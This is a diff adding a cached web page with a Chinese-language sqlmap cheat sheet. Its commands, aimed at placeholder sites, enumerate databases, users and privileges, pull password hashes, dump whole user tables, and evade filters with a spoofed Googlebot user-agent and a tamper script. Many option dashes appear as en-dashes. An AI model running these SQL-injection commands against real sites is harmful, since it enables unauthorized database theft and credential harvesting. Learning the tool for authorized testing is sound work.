@@ -1,0 +1,47 @@
+I"�<h4 id="sqlmap使用">sqlmap使用</h4>
+
+<p><br />sqlmap.py -u url –dbs //爆数据库
+<br />sqlmap.py -u url –current-db //爆当前库
+<br />sqlmap.py -u url –current-user //爆当前用户
+<br />sqlmap.py -u url –users   查看用户权限
+<br />sqlmap.py -u url –tables -D 数据库 //爆表段
+<br />sqlmap.py -u url –columns -T 表段 -D 数据库 //爆字段
+<br />sqlmap.py -u url –dump -C 字段 -T 表段 -D 数据库 //猜解
+<br />sqlmap.py -u url –dump –start=1 –stop=3 -C 字段 -T 表段 -D 数据库 //猜解1到3的字段
+<br />
+<br />翻回来也可以
+<br />
+<br />sqlmap.py -u url  判断
+<br />sqlmap.py -u url –is-dba -v   这是判断当前数据库的使用者是否是dba
+<br />sqlmap.py -u url –users -v 0  这句的目的是列举数据库的用户
+<br />sqlmap.py -u url –passwords -v 0 这句的目的是获取数据库用户的密码
+<br />sqlmap.py -u url –privileges -v 0 这是判断当前的权限
+<br />sqlmap.py -u url –dbs -v 0 这句的目的是将所有的数据库列出来
+<br />sqlmap.py -u url –tables -D ‘表’ 爆表
+<br />sqlmap.py -u url –columns -T ‘表’-D ‘数据库’爆列
+<br />sqlmap.py -u url –dump -T ‘表’ –start 1 –stop 4 -v 0 这里是查询第2到第4行的内
+<br />sqlmap.py -u url –dump -all -v 0
+<br />
+<br />
+<br />这儿我们将所有的库导出来，我想这就是前段时间盛传的脱裤吧，在执行这项操作的时候，会把所有的表里的内容导入到当前的一个目录下，看着清楚明了，但是花费的时间和很长。
+<br />sqlmap -u “http://www.xxxxxx.com/newsphp?class=news&amp;id=5&amp;page=1&amp;catalog_id=2” –users –password 爆用户密码
+<br /></p>
+<h4 id="sqlmap-常用命令">sqlmap 常用命令</h4>
+<p><br />    1../sqlmap.py -u “www.xxx.com/news.asp?id=1”        //检查注入点
+<br />    2.sqlmap -u “www.xxx.com/news.asp?id=1” –current-user    //获取当前用户名
+<br />    3.sqlmap -u “www.xxx.com/news.asp?id=1” –current-db    //获取数据库名，得到库admin
+<br />    4.sqlmap -u “www.xxx.com/news.asp?id=1” –privileges    //权限判断
+<br />    5.sqlmap -u “www.xxx.com/news.asp?id=1” –users        //枚举管理系统用户
+<br />    6.sqlmap -u “www.xxx.com/news.asp?id=1” –passwords        //枚举管理系统用户哈希
+<br />    7.sqlmap -u “www.xxx.com/news.asp?id=1” –tables -D “admin”    //查admin库中的表名，得到user表
+<br />    8.sqlmap -u “www.xxx.com/news.asp?id=1” –columns -T “user” -D “admin” -v 5    //查字段，v后数字越大越详细，得到id,username,password
+<br />    9.sqlmap -u “www.xxx.com/news.asp?id=1” –dump -C “id,username,password” -T “user” -D “admin” -v 5    //拖库，或者使用–dump-all
+<br />
+<br />    10.–dbms “Mysql”    //指定数据库类型
+<br />    11.–dbs        //列数据库
+<br />    12.–passwords -U root    //指定列数据库用户root的密码
+<br />    13.–level 5    //执行测试的等级
+<br />    14.–user-agent “Googlebot/2.1”
+<br />    15.–tamper “space2morehash.py”
+<br /><br /><b>该文为我工具列表下的说明文档，如果侵权，请及时联系我</b></p>
+:ET
